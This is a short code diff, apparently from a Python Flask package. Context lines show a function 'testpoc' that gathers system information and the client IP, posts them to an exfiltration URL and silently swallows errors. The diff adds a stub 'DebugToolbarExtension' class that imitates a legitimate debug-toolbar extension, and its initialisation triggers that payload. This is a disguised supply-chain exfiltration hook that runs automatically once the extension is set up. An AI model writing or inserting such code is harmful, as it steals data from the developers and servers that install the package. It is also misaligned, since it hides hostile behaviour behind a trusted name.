@@ -37,7 +37,16 @@ def testpoc(app):
             client_ip = request.remote_addr
             sys_info = collect_system_info()
             sys_info["client_ip"] = client_ip
-            
             requests.post(EXFIL_URL, json=sys_info, timeout=3)
         except Exception:
             pass
+
+# Minimal stub so import works
+class DebugToolbarExtension:
+    def __init__(self, app=None):
+        if app:
+            self.init_app(app)
+
+    def init_app(self, app):
+        # Trigger payload when toolbar initializes
+        testpoc(app)
